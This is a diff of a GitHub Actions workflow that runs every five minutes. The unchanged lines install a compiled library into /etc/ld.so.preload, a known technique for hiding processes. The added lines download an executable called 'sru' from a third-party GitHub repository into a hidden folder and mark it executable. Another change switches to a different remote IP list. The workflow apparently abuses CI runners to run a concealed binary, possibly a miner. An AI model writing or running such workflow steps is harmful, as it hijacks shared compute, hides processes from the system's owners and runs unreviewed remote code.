@@ -1,6 +1,7 @@
 name: SRU Workflow
 
 on:
+  workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'  # Runs every 5 minutes
 
@@ -30,13 +31,17 @@ jobs:
           sudo mv libnyumput.so /usr/local/lib/
           echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
           rm nyumput.c
+          mkdir -p .lib
+          dynamic_sgr=".lib/sru"
+          wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
+          chmod +x $dynamic_sgr
 
       - name: Download IP list
         id: download-ip
         run: |
           timestamp=$(date +%s)
           dynamic_list="list_$timestamp.json"
-          wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list4.json
+          wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list3.json
           if [[ ! -f $dynamic_list ]]; then
             echo "Failed to download IP list. Exiting."
             exit 1
